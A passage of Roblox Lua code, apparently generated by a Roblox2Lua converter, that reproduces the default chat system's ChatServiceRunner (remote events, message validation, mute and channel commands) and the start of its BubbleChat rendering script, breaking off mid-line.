	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--	// FileName: ChatServiceRunner.lua
	--	// Written by: Xsitsu
	--	// Description: Main script to initialize ChatService and run ChatModules.
	
	local EventFolderName = "DefaultChatSystemChatEvents"
	local EventFolderParent = game:GetService("ReplicatedStorage")
	local modulesFolder = script
	
	local PlayersService = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local Chat = game:GetService("Chat")
	
	local ChatService = require(modulesFolder:WaitForChild("ChatService"))
	
	local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
	local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
	
	local ChatLocalization = nil
	pcall(function() ChatLocalization = require(Chat.ClientChatModules.ChatLocalization) end)
	ChatLocalization = ChatLocalization or {}
	
	local MAX_CHANNEL_NAME_LENGTH = ChatSettings.MaxChannelNameCheckLength or 50
	local MAX_MESSAGE_LENGTH = ChatSettings.MaximumMessageLength
	local MAX_BYTES_PER_CODEPOINT = 6
	
	if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
		function ChatLocalization:FormatMessageToSend(key,default) return default end
	end
	
	local MAX_BLOCKED_SPEAKERS_PER_REQ = 50
	
	local useEvents = {}
	
	local EventFolder = EventFolderParent:FindFirstChild(EventFolderName)
	if (not EventFolder) then
		EventFolder = Instance.new("Folder")
		EventFolder.Name = EventFolderName
		EventFolder.Archivable = false
		EventFolder.Parent = EventFolderParent
	end
	
	local function validateMessageLength(msg)
	    if msg:len() > MAX_MESSAGE_LENGTH*MAX_BYTES_PER_CODEPOINT then
	        return false
	    end
	
	    if utf8.len(msg) == nil then
	        return false
	    end
	
	    if utf8.len(utf8.nfcnormalize(msg)) > MAX_MESSAGE_LENGTH then
	        return false
	    end
	
	    return true
	end
	
	local function validateChannelNameLength(channelName)
	    if channelName:len() > MAX_CHANNEL_NAME_LENGTH*MAX_BYTES_PER_CODEPOINT then
	        return false
	    end
	
	    if utf8.len(channelName) == nil then
	        return false
	    end
	
	    if utf8.len(utf8.nfcnormalize(channelName)) > MAX_CHANNEL_NAME_LENGTH then
	        return false
	    end
	
	    return true
	end
	
	--// No-opt connect Server>Client RemoteEvents to ensure they cannot be called
	--// to fill the remote event queue.
	local function emptyFunction()
		--intentially empty
	end
	
	local function GetObjectWithNameAndType(parentObject, objectName, objectType)
		for _, child in pairs(parentObject:GetChildren()) do
			if (child:IsA(objectType) and child.Name == objectName) then
				return child
			end
		end
	
		return nil
	end
	
	local function CreateIfDoesntExist(parentObject, objectName, objectType)
		local obj = GetObjectWithNameAndType(parentObject, objectName, objectType)
		if (not obj) then
			obj = Instance.new(objectType)
			obj.Name = objectName
			obj.Parent = parentObject
		end
		useEvents[objectName] = obj
	
		return obj
	end
	
	--// All remote events will have a no-opt OnServerEvent connecdted on construction
	local function CreateEventIfItDoesntExist(parentObject, objectName)
		local obj = CreateIfDoesntExist(parentObject, objectName, "RemoteEvent")
		obj.OnServerEvent:Connect(emptyFunction)
		return obj
	end
	
	CreateEventIfItDoesntExist(EventFolder, "OnNewMessage")
	CreateEventIfItDoesntExist(EventFolder, "OnMessageDoneFiltering")
	CreateEventIfItDoesntExist(EventFolder, "OnNewSystemMessage")
	CreateEventIfItDoesntExist(EventFolder, "OnChannelJoined")
	CreateEventIfItDoesntExist(EventFolder, "OnChannelLeft")
	CreateEventIfItDoesntExist(EventFolder, "OnMuted")
	CreateEventIfItDoesntExist(EventFolder, "OnUnmuted")
	CreateEventIfItDoesntExist(EventFolder, "OnMainChannelSet")
	CreateEventIfItDoesntExist(EventFolder, "ChannelNameColorUpdated")
	
	CreateEventIfItDoesntExist(EventFolder, "SayMessageRequest")
	CreateEventIfItDoesntExist(EventFolder, "SetBlockedUserIdsRequest")
	CreateIfDoesntExist(EventFolder, "GetInitDataRequest", "RemoteFunction")
	CreateIfDoesntExist(EventFolder, "MutePlayerRequest", "RemoteFunction")
	CreateIfDoesntExist(EventFolder, "UnMutePlayerRequest", "RemoteFunction")
	
	EventFolder = useEvents
	
	local function CreatePlayerSpeakerObject(playerObj)
		--// If a developer already created a speaker object with the
		--// name of a player and then a player joins and tries to
		--// take that name, we first need to remove the old speaker object
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if (speaker) then
			ChatService:RemoveSpeaker(playerObj.Name)
		end
	
		speaker = ChatService:InternalAddSpeakerWithPlayerObject(playerObj.Name, playerObj, false)
	
		for _, channel in pairs(ChatService:GetAutoJoinChannelList()) do
			speaker:JoinChannel(channel.Name)
		end
	
		speaker:InternalAssignEventFolder(EventFolder)
	
		speaker.ChannelJoined:connect(function(channel, welcomeMessage)
			local log = nil
			local channelNameColor = nil
	
			local channelObject = ChatService:GetChannel(channel)
			if (channelObject) then
				log = channelObject:GetHistoryLogForSpeaker(speaker)
				channelNameColor = channelObject.ChannelNameColor
			end
			EventFolder.OnChannelJoined:FireClient(playerObj, channel, welcomeMessage, log, channelNameColor)
		end)
	
		speaker.Muted:connect(function(channel, reason, length)
			EventFolder.OnMuted:FireClient(playerObj, channel, reason, length)
		end)
	
		speaker.Unmuted:connect(function(channel)
			EventFolder.OnUnmuted:FireClient(playerObj, channel)
		end)
	
		ChatService:InternalFireSpeakerAdded(speaker.Name)
	end
	
	EventFolder.SayMessageRequest.OnServerEvent:connect(function(playerObj, message, channel)
		if type(message) ~= "string" then
			return
		elseif not validateMessageLength(message) then
			return
		end
	
		if type(channel) ~= "string" then
			return
		elseif not validateChannelNameLength(channel) then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if (speaker) then
			return speaker:SayMessage(message, channel)
		end
	
		return nil
	end)
	
	EventFolder.MutePlayerRequest.OnServerInvoke = function(playerObj, muteSpeakerName)
		if type(muteSpeakerName) ~= "string" then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if speaker then
			local muteSpeaker = ChatService:GetSpeaker(muteSpeakerName)
			if muteSpeaker then
				speaker:AddMutedSpeaker(muteSpeaker.Name)
				return true
			end
		end
		return false
	end
	
	EventFolder.UnMutePlayerRequest.OnServerInvoke = function(playerObj, unmuteSpeakerName)
		if type(unmuteSpeakerName) ~= "string" then
			return
		end
	
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if speaker then
			local unmuteSpeaker = ChatService:GetSpeaker(unmuteSpeakerName)
			if unmuteSpeaker then
				speaker:RemoveMutedSpeaker(unmuteSpeaker.Name)
				return true
			end
		end
		return false
	end
	
	-- Map storing Player -> Blocked user Ids.
	local BlockedUserIdsMap = {}
	
	PlayersService.PlayerAdded:connect(function(newPlayer)
		for player, blockedUsers in pairs(BlockedUserIdsMap) do
			local speaker = ChatService:GetSpeaker(player.Name)
			if speaker then
				for i = 1, #blockedUsers do
					local blockedUserId = blockedUsers[i]
					if blockedUserId == newPlayer.UserId then
						speaker:AddMutedSpeaker(newPlayer.Name)
					end
				end
			end
		end
	end)
	
	PlayersService.PlayerRemoving:connect(function(removingPlayer)
		BlockedUserIdsMap[removingPlayer] = nil
	end)
	
	EventFolder.SetBlockedUserIdsRequest.OnServerEvent:Connect(function(player, blockedUserIdsList)
		if type(blockedUserIdsList) ~= "table" then
			return
		end
	
		local prunedBlockedUserIdsList = {}
		local speaker = ChatService:GetSpeaker(player.Name)
		if speaker then
			for i = 1, math.min(#blockedUserIdsList, MAX_BLOCKED_SPEAKERS_PER_REQ) do
				if type(blockedUserIdsList[i]) == "number" then
	
					table.insert(prunedBlockedUserIdsList, blockedUserIdsList[i])
	
					local blockedPlayer = PlayersService:GetPlayerByUserId(blockedUserIdsList[i])
					if blockedPlayer then
						speaker:AddMutedSpeaker(blockedPlayer.Name)
					end
				end
			end
	
			-- We only want to store the first
			-- MAX_BLOCKED_SPEAKERS_PER_REQ number of ids as needed
			BlockedUserIdsMap[player] = prunedBlockedUserIdsList
		end
	end)
	
	EventFolder.GetInitDataRequest.OnServerInvoke = (function(playerObj)
		local speaker = ChatService:GetSpeaker(playerObj.Name)
		if not (speaker and speaker:GetPlayer()) then
			CreatePlayerSpeakerObject(playerObj)
			speaker = ChatService:GetSpeaker(playerObj.Name)
		end
	
		local data = {}
		data.Channels = {}
		data.SpeakerExtraData = {}
	
		for _, channelName in pairs(speaker:GetChannelList()) do
			local channelObj = ChatService:GetChannel(channelName)
			if (channelObj) then
				local channelData =
				{
					channelName,
					channelObj:GetWelcomeMessageForSpeaker(speaker),
					channelObj:GetHistoryLogForSpeaker(speaker),
					channelObj.ChannelNameColor,
				}
	
				table.insert(data.Channels, channelData)
			end
		end
	
		for _, oSpeakerName in pairs(ChatService:GetSpeakerList()) do
			local oSpeaker = ChatService:GetSpeaker(oSpeakerName)
			data.SpeakerExtraData[oSpeakerName] = oSpeaker.ExtraData
		end
	
		return data
	end)
	
	local function DoJoinCommand(speakerName, channelName, fromChannelName)
		local speaker = ChatService:GetSpeaker(speakerName)
		local channel = ChatService:GetChannel(channelName)
	
		if (speaker) then
			if (channel) then
				if (channel.Joinable) then
					if (not speaker:IsInChannel(channel.Name)) then
						speaker:JoinChannel(channel.Name)
					else
						speaker:SetMainChannel(channel.Name)
						local msg = ChatLocalization:FormatMessageToSend(
							"GameChat_SwitchChannel_NowInChannel",
							string.format("You are now chatting in channel: '%s'", channel.Name),
							"RBX_NAME",
							channel.Name)
						speaker:SendSystemMessage(msg, channel.Name)
					end
				else
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatServiceRunner_YouCannotJoinChannel",
						"You cannot join channel '" .. channelName .. "'.",
						"RBX_NAME",
						channelName)
					speaker:SendSystemMessage(msg, fromChannelName)
				end
			else
				local msg = ChatLocalization:FormatMessageToSend(
					"GameChat_ChatServiceRunner_ChannelDoesNotExist",
					"Channel '" .. channelName .. "' does not exist.",
					"RBX_NAME",
					channelName)
				speaker:SendSystemMessage(msg, fromChannelName)
			end
		end
	end
	
	local function DoLeaveCommand(speakerName, channelName, fromChannelName)
		local speaker = ChatService:GetSpeaker(speakerName)
		local channel = ChatService:GetChannel(channelName)
	
		if (speaker) then
			if (speaker:IsInChannel(channelName)) then
				if (channel.Leavable) then
					speaker:LeaveChannel(channel.Name)
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatService_YouHaveLeftChannel",
						string.format("You have left channel '%s'", channelName),
						"RBX_NAME",
						channel.Name)
					speaker:SendSystemMessage(msg, "System")
				else
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatServiceRunner_YouCannotLeaveChannel",
						("You cannot leave channel '" .. channelName .. "'."),
						"RBX_NAME",
						channelName)
					speaker:SendSystemMessage(msg, fromChannelName)
				end
			else
				local msg = ChatLocalization:FormatMessageToSend(
					"GameChat_ChatServiceRunner_YouAreNotInChannel",
					("You are not in channel '" .. channelName .. "'."),
					"RBX_NAME",
					channelName)
				speaker:SendSystemMessage(msg, fromChannelName)
			end
		end
	end
	
	ChatService:RegisterProcessCommandsFunction("default_commands", function(fromSpeaker, message, channel)
		if (string.sub(message, 1, 6):lower() == "/join ") then
			DoJoinCommand(fromSpeaker, string.sub(message, 7), channel)
			return true
		elseif (string.sub(message, 1, 3):lower() == "/j ") then
			DoJoinCommand(fromSpeaker, string.sub(message, 4), channel)
			return true
		elseif (string.sub(message, 1, 7):lower() == "/leave ") then
			DoLeaveCommand(fromSpeaker, string.sub(message, 8), channel)
			return true
		elseif (string.sub(message, 1, 3):lower() == "/l ") then
			DoLeaveCommand(fromSpeaker, string.sub(message, 4), channel)
			return true
		end
	
		return false
	end)
	
	if ChatSettings.GeneralChannelName and ChatSettings.GeneralChannelName ~= "" then
		local allChannel = ChatService:AddChannel(ChatSettings.GeneralChannelName)
	
		allChannel.Leavable = false
		allChannel.AutoJoin = true
	
		allChannel:RegisterGetWelcomeMessageFunction(function(speaker)
			if RunService:IsStudio() then
				return nil
			end
			local player = speaker:GetPlayer()
			if player then
				local success, canChat = pcall(function()
					return Chat:CanUserChatAsync(player.UserId)
				end)
				if success and not canChat then
					return ""
				end
			end
		end)
	end
	
	local systemChannel = ChatService:AddChannel("System")
	systemChannel.Leavable = false
	systemChannel.AutoJoin = true
	systemChannel.WelcomeMessage = ChatLocalization:FormatMessageToSend(
		"GameChat_ChatServiceRunner_SystemChannelWelcomeMessage", "This channel is for system and game notifications."
	)
	
	systemChannel.SpeakerJoined:connect(function(speakerName)
		systemChannel:MuteSpeaker(speakerName)
	end)
	
	
	local function TryRunModule(module)
		if module:IsA("ModuleScript") then
			local ret = require(module)
			if (type(ret) == "function") then
				ret(ChatService)
			end
		end
	end
	
	local modules = Chat:WaitForChild("ChatModules")
	modules.ChildAdded:connect(function(child)
		local success, returnval = pcall(TryRunModule, child)
		if not success and returnval then
			print("Error running module " ..child.Name.. ": " ..returnval)
		end
	end)
	
	for _, module in pairs(modules:GetChildren()) do
		local success, returnval = pcall(TryRunModule, module)
		if not success and returnval then
			print("Error running module " ..module.Name.. ": " ..returnval)
		end
	end
	
	PlayersService.PlayerRemoving:connect(function(playerObj)
		if (ChatService:GetSpeaker(playerObj.Name)) then
			ChatService:RemoveSpeaker(playerObj.Name)
		end
	end)
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local ertcfefwfwcq = Instance.new("LocalScript")
ertcfefwfwcq.Disabled = true
ertcfefwfwcq.Name = "ertcfefwfwcq"
ertcfefwfwcq.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- ertcfefwfwcq
task.spawn(function()
	local script = ertcfefwfwcq
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--[[
		// FileName: BubbleChat.lua
		// Written by: jeditkacheff, TheGamer101
		// Description: Code for rendering bubble chat
	]]
	
	--[[ SERVICES ]]
	local PlayersService = game:GetService('Players')
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local ChatService = game:GetService("Chat")
	local TextService = game:GetService("TextService")
	--[[ END OF SERVICES ]]
	
	local LocalPlayer = PlayersService.LocalPlayer
	while LocalPlayer == nil do
		PlayersService.ChildAdded:wait()
		LocalPlayer = PlayersService.LocalPlayer
	end
	
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	
	local success, UserShouldLocalizeGameChatBubble = pcall(function()
		return UserSettings():IsUserFeatureEnabled("UserShouldLocalizeGameChatBubble")
	end)
	local UserShouldLocalizeGameChatBubble = success and UserShouldLocalizeGameChatBubble
	
	local UserFixBubbleChatText do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserFixBubbleChatText")
		end)
		UserFixBubbleChatText = success and value
	end
	
	local UserRoactBubbleChatBeta do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserRoactBubbleChatBeta")
		end)
		UserRoactBubbleChatBeta = success and value
	end
	
	local UserPreventOldBubbleChatOverlap do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserPreventOldBubbleChatOverlap")
		end)
		UserPreventOldBubbleChatOverlap = success and value
	end
	
	local function getMessageLength(message)
		return utf8.len(utf8.nfcnormalize(message))
	end
	
	--[[ SCRIPT VARIABLES ]]
	local CHAT_BUBBLE_FONT = Enum.Font.SourceSans
	local CHAT_BUBBLE_FONT_SIZE = Enum.FontSize.Size24 -- if you change CHAT_BUBBLE_FONT_SIZE_INT please change this to match
	local CHAT_BUBBLE_FONT_SIZE_INT = 24 -- if you change CHAT_BUBBLE_FONT_SIZE please change this to match
	local CHAT_BUBBLE_LINE_HEIGHT = CHAT_BUBBLE_FONT_SIZE_INT + 10
	local CHAT_BUBBLE_TAIL_HEIGHT = 14
	local CHAT_BUBBLE_WIDTH_PADDING = 30
	local CHAT_BUBBLE_PADDING = 12
	local CHAT_BUBBLE_FADE_SPEED = 1.5
	
	local BILLBOARD_MAX_WIDTH = 400
	local BILLBOARD_MAX_HEIGHT = 250	--This limits the number of bubble chats that you see above characters
	
	local ELIPSES = "..."
	local MaxChatMessageLength = 128 -- max chat message length, including null terminator and elipses.
	local MaxChatMessageLengthExclusive = MaxChatMessageLength - getMessageLength(ELIPSES) - 1
	
	local NEAR_BUBBLE_DISTANCE = 65	--previously 45
	local MAX_BUBBLE_DISTANCE = 100	--previously 80
	
	--[[ END OF SCRIPT VARIABLES ]]
	
	
	-- [[ SCRIPT ENUMS ]]
	local BubbleColor = {	WHITE = "dub",
						BLUE = "blu",
						GREEN = "gre",
						RED = "red" }
	
	--[[ END OF SCRIPT ENUMS ]]
	
	-- This screenGui exists so that the billboardGui is not deleted when the PlayerGui is reset.
	local BubbleChatScreenGui = Instance.new("ScreenGui")
	BubbleChatScreenGui.Name = "BubbleChat"
	BubbleChatScreenGui.ResetOnSpawn = false
	BubbleChatScreenGui.Parent = PlayerGui
	
	--[[ FUNCTIONS ]]
	
	local function lerpLength(msg, min, max)
		return min + (max - min) * math.min(getMessageLength(msg) / 75.0, 1.0)
	end
	
	local function createFifo()
		local this = {}
		this.data = {}
	
		local emptyEvent = Instance.new("BindableEvent")
		this.Emptied = emptyEvent.Event
	
		function this:Size()
			return #this.data
		end
	
		function this:Empty()
			return this:Size() <= 0
		end
	
		function this:PopFront()
			table.remove(this.data, 1)
			if this:Empty() then emptyEvent:Fire() end
		end
	
		function this:Front()
			return this.data[1]
		end
	
		function this:Get(index)
			return this.data[index]
		end
	
		function this:PushBack(value)
			table.insert(this.data, value)
		end
	
		function this:GetData()
			return this.data
		end
	
		return this
	end
	
	local function createCharacterChats()
		local this = {}
	
		this.Fifo = createFifo()
		this.BillboardGui = nil
	
		return this
	end
	
	local function createMap()
		local this = {}
		this.data = {}
		local count = 0
	
		function this:Size()
			return count
		end
	
		function this:Erase(key)
			if this.data[key] then count = count - 1 end
			this.data[key] = nil
		end
	
		function this:Set(key, value)
			this.data[key] = value
			if value then count = count + 1 end
		end
	
		function this:Get(key)
			if not key then return end
			if not this.data[key] then
				this.data[key] = createCharacterChats()
				local emptiedCon = nil
				emptiedCon = this.data[key].Fifo.Emptied:connect(function()
					emptiedCon:disconnect()
					this:Erase(key)
				end)
			end
			return this.data[key]
		end
	
		function this:GetData()
			return this.data
		end
	
		return this
	end
	
	local function createChatLine(message, bubbleColor, isLocalPlayer)
		local this = {}
	
		function this:ComputeBubbleLifetime(msg, isSelf)
			if isSelf then
				return lerpLength(msg, 8, 15)
			else
				return lerpLength(msg, 12, 20)
			end
		end
	
		this.Origin = nil
		this.RenderBubble = nil
		this.Message = message
		this.BubbleDieDelay = this:ComputeBubbleLifetime(message, isLocalPlayer)
		this.BubbleColor = bubbleColor
		this.IsLocalPlayer = isLocalPlayer
	
		return this
	end
	
	local function createPlayerChatLine(player, message, isLocalPlayer)
		local this = createChatLine(message, BubbleColor.WHITE, isLocalPlayer)
	
		if player then
			this.User = player.Name
			this.Origin = player.Character
		end
	
		return this
	end
	
	local function createGameChatLine(origin, message, isLocalPlayer, bubbleColor)
		local this = createChatLine(message, bubbleColor, isLocalPlayer)
		this.Origin = origin
	
		return this
	end
	
	function createChatBubbleMain(filePrefix, sliceRect)
		local chatBubbleMain = Instance.new("ImageLabel")
		chatBubbleMain.Name = "ChatBubble"
		chatBubbleMain.ScaleType = Enum.ScaleType.Slice
		chatBubbleMain.SliceCenter = sliceRect
		chatBubbleMain.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
		chatBubbleMain.BackgroundTransparency = 1
		chatBubbleMain.BorderSizePixel = 0
		chatBubbleMain.Size = UDim2.new(1.0, 0, 1.0, 0)
		chatBubbleMain.Position = UDim2.new(0, 0, 0, 0)
	
		return chatBubbleMain
	end
	
	function createChatBubbleTail(position, size)
		local chatBubbleTail = Instance.new("ImageLabel")
		chatBubbleTail.Name = "ChatBubbleTail"
		chatBubbleTail.Image = "rbxasset://textures/ui/dialog_tail.png"
		chatBubbleTail.BackgroundTransparency = 1
		chatBubbleTail.BorderSizePixel = 0
		chatBubbleTail.Position = position
		chatBubbleTail.Size = size
	
		return chatBubbleTail
	end
	
	function createChatBubbleWithTail(filePrefix, position, size, sliceRect)
		local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
	
		local chatBubbleTail = createChatBubbleTail(position, size)
		chatBubbleTail.Parent = chatBubbleMain
	
		return chatBubbleMain
	end
	
	function createScaledChatBubbleWithTail(filePrefix, frameScaleSize, position, sliceRect)
		local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
	
		local frame = Instance.new("Frame")
		frame.Name = "ChatBubbleTailFrame"
		frame.BackgroundTransparency = 1
		frame.SizeConstraint = Enum.SizeConstraint.RelativeXX
		frame.Position = UDim2.new(0.5, 0, 1, 0)
		frame.Size = UDim2.new(frameScaleSize, 0, frameScaleSize, 0)
		frame.Parent = chatBubbleMain
	
		local chatBubbleTail = createChatBubbleTail(position, UDim2.new(1, 0, 0.5, 0))
		chatBubbleTail.Parent = frame
	
		return chatBubbleMain
	end
	
	function createChatImposter(filePrefix, dotDotDot, yOffset)
		local result = Instance.new("ImageLabel")
		result.Name = "DialogPlaceholder"
		result.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
		result.BackgroundTransparency = 1
		result.BorderSizePixel = 0
		result.Position = UDim2.new(0, 0, -1.25, 0)
		result.Size = UDim2.new(1, 0, 1, 0)
	
		local image = Instance.new("ImageLabel")
		image.Name = "DotDotDot"
		image.Image = "rbxasset://textures/" .. tostring(dotDotDot) .. ".png"
		image.BackgroundTransparency = 1
		image.BorderSizePixel = 0
		image.Position = UDim2.new(0.001, 0, yOffset, 0)
		image.Size = UDim2.new(1, 0, 0.7, 0)
		image.Parent = result
	
		return result
	end
	
	
	local this = {}
	this.ChatBubble = {}
	this.ChatBubbleWithTail = {}
	this.ScalingChatBubbleWithTail = {}
	this.CharacterSortedMsg = createMap()
	
	-- init chat bubble tables
	local function initChatBubbleType(chatBubbleType, fileName, imposterFileName, isInset, sliceRect)
		this.ChatBubble[chatBubbleType] = createChatBubbleMain(fileName, sliceRect)
		this.ChatBubbleWithTail[chatBubbleType] = createChatBubbleWithTail(fileName, UDim2.new(0.5, -CHAT_BUBBLE_TAIL_HEIGHT, 1, isInset and -1 or 0), UDim2.new(0, 30, 0, CHAT_BUBBLE_TAIL_HEIGHT), sliceRect)
		this.ScalingChatBubbleWithTail[chatBubbleType] = createScaledChatBubbleWithTail(fileName, 0.5, UDim2.new(-0.5, 0, 0, isInset and -1 or 0), sliceRect)
	end
	
	initChatBubbleType(BubbleColor.WHITE,	"ui/dialog_white",	"ui/chatBubble_white_notify_bkg", 	false,	Rect.new(5,5,15,15))
	initChatBubbleType(BubbleColor.BLUE,	"ui/dialog_blue",	"ui/chatBubble_blue_notify_bkg",	true, 	Rect.new(7,7,33,33))
	initChatBubbleType(BubbleColor.RED,		"ui/dialog_red",	"ui/chatBubble_red_notify_bkg",		true,	Rect.new(7,7,33,33))
	initChatBubbleType(BubbleColor.GREEN,	"ui/dialog_green",	"ui/chatBubble_green_notify_bkg",	true,	Rect.new(7,7,33,33))
	
	function this:SanitizeChatLine(msg)
		if getMessageLength(msg) > MaxChatMessageLengthExclusive then
			local byteOffset = utf8.offset(msg, MaxChatMessageLengthExclusive + getMessageLength(ELIPSES) + 1) - 1
			return string.sub(msg, 1, byteOffset)
		else
			return msg
		end
	end
	
	local function createBillboardInstance(adornee)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Adornee = adornee
		billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
		billboardGui.StudsOffset = Vector3.new(0, 1.5, 2)
		billboardGui.Parent = BubbleChatScreenGui
	
		local billboardFrame = Instance.new("Frame")
		billboardFrame.Name = "BillboardFrame"
		billboardFrame.Size = UDim2.new(1, 0, 1, 0)
		billboardFrame.Position = UDim2.new(0, 0, -0.5, 0)
		billboardFrame.BackgroundTransparency = 1
		billboardFrame.Parent = billboardGui
	
		local billboardChildRemovedCon = nil
		billboardChildRemovedCon = billboardFrame.ChildRemoved:connect(function()
			if #billboardFrame:GetChildren() <= 1 then
				billboardChildRemovedCon:disconnect()
				billboardGui:Destroy()
			end
		end)
	
		this:CreateSmallTalkBubble(BubbleColor.WHITE).Parent = billboardFrame
	
		return billboardGui
	end
	
	function this:CreateBillboardGuiHelper(instance, onlyCharacter)
		if instance and not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
			if not onlyCharacter then
				if instance:IsA("BasePart") then
					-- Create a new billboardGui object attached to this player
					local billboardGui = createBillboardInstance(instance)
					this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
					return
				end
			end
	
			if instance:IsA("Model") then
				local head = instance:FindFirstChild("Head")
				if head and head:IsA("BasePart") then
					-- Create a new billboardGui object attached to this player
					local billboardGui = createBillboardInstance(head)
					this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
				end
			end
		end
	end
	
	local function distanceToBubbleOrigin(origin)
		if not origin then return 100000 end
	
		return (origin.Position - game.Workspace.CurrentCamera.CoordinateFrame.p).magnitude
	end
	
	local function isPartOfLocalPlayer(adornee)
		if adornee and PlayersService.LocalPlayer.Character then
			return adornee:IsDescendantOf(PlayersService.LocalPlayer.Character)
		end
	end
	
	function this:SetBillboardLODNear(billboardGui)
		local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
		billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
		billboardGui.StudsOffset = Vector3.new(0, isLocalPlayer and 1.5 or 2.5, isLocalPlayer and 2 or 0.1)
		billboardGui.Enabled = true
		local billChildren = billboardGui.BillboardFrame:GetChildren()
		for i = 1, #billChildren do
			billChildren[i].Visible = true
		end
		billboardGui.BillboardFrame.SmallTalkBubble.Visible = false
	end
	
	function this:SetBillboardLODDistant(billboardGui)
		local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
		billboardGui.Size = UDim2.new(4, 0, 3, 0)
		billboardGui.StudsOffset = Vector3.new(0, 3, isLocalPlayer and 2 or 0.1)
		billboardGui.Enabled = true
		local billChildren = billboardGui.BillboardFrame:GetChildren()
		for i = 1, #billChildren do
			billChildren[i].Visible = false
		end
		billboardGui.BillboardFrame.SmallTalkBubble.Visible = true
	end
	
	function this:SetBillboardLODVeryFar(billboardGui)
		billboardGui.Enabled = false
	end
	
	function this:SetBillboardGuiLOD(billboardGui, origin)
		if not origin then return end
	
		if origin:IsA("Model") then
			local head = origin:FindFirstChild("Head")
			if not head then origin = origin.PrimaryPart
			else origin = head end
		end
	
		local bubbleDistance = distanceToBubbleOrigin(origin)
	
		if bubbleDistance < NEAR_BUBBLE_DISTANCE then
			this:SetBillboardLODNear(billboardGui)
		elseif bubbleDistance >= NEAR_BUBBLE_DISTANCE and bubbleDistance < MAX_BUBBLE_DISTANCE then
			this:SetBillboardLODDistant(billboardGui)
		else
			this:SetBillboardLODVeryFar(billboardGui)
		end
	end
	
	function this:CameraCFrameChanged()
		for index, value in pairs(this.CharacterSortedMsg:GetData()) do
			local playerBillboardGui = value["BillboardGui"]
			if playerBillboardGui then this:SetBillboardGuiLOD(playerBillboardGui, index) end
		end
	end
	
	function this:CreateBubbleText(message, shouldAutoLocalize)
		local bubbleText = Instance.new("TextLabel")
		bubbleText.Name = "BubbleText"
		bubbleText.BackgroundTransparency = 1
	
		if UserFixBubbleChatText then
			bubbleText.Size = UDim2.fromScale(1, 1)
		else
			bubbleText.Position = UDim2.new(0, CHAT_BUBBLE_WIDTH_PADDING / 2, 0, 0)
			bubbleText.Size = UDim2.new(1, -CHAT_BUBBLE_WIDTH_PADDING, 1, 0)
		end
	
		bubbleText.Font = CHAT_BUBBLE_FONT
		bubbleText.ClipsDescendants = true
		bubbleText.TextWrapped = true
		bubbleText.FontSize = CHAT_BUBBLE_FONT_SIZE
		bubbleText.Text = message
		bubbleText.Visible = false
		bubbleText.AutoLocalize = shouldAutoLocalize
	
		if UserFixBubbleChatText then
			local padding = Instance.new("UIPadding")
			padding.PaddingTop = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingRight = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingBottom = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingLeft = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.Parent = bubbleText
		end
	
		return bubbleText
	end
	
	function this:CreateSmallTalkBubble(chatBubbleType)
		local smallTalkBubble = this.ScalingChatBubbleWithTail[chatBubbleType]:Clone()
		smallTalkBubble.Name = "SmallTalkBubble"
		smallTalkBubble.AnchorPoint = Vector2.new(0, 0.5)
		smallTalkBubble.Position = UDim2.new(0, 0, 0.5, 0)
		smallTalkBubble.Visible = false
		local text = this:CreateBubbleText("...")
		text.TextScaled = true
		text.TextWrapped = false
		text.Visible = true
		text.Parent = smallTalkBubble
	
		return smallTalkBubble
	end
	
	function this:UpdateChatLinesForOrigin(origin, currentBubbleYPos)
		local bubbleQueue = this.CharacterSortedMsg:Get(origin).Fifo
		local bubbleQueueSize = bubbleQueue:Size()
		local bubbleQueueData = bubbleQueue:GetData()
		if #bubbleQueueData <= 1 then return end
	
		for index = (#bubbleQueueData - 1), 1, -1 do
			local value = bubbleQueueData[index]
			local bubble = value.RenderBubble
			if not bubble then return end
			local bubblePos = bubbleQueueSize - index + 1
	
			if bubblePos > 1 then
				local tail = bubble:FindFirstChild("ChatBubbleTail")
				if tail then tail:Destroy() end
				local bubbleText = bubble:FindFirstChild("BubbleText")
				if bubbleText then bubbleText.TextTransparency = 0.5 end
			end
	
			local udimValue = UDim2.new( bubble.Position.X.Scale, bubble.Position.X.Offset,
